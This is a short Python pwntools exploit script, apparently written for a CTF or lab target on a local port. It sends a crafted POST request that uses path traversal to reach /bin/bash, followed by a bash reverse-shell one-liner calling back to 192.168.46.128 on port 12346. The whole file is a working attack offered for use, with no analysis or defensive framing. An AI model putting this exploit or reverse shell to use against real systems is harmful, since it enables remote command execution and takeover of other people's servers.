from pwn import *
context.log_level = 'debug'
p = remote('127.0.0.1', 9999)
 
ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

sl(b'POST //...//...//...//...//...//...//...//...//...//.../bin/bash')
sl(b'Content-Length: 100')
p.sendline()
p.sendline()
sl('bash -i >& /dev/tcp/192.168.46.128/12346 0>&1')
p.interactive()
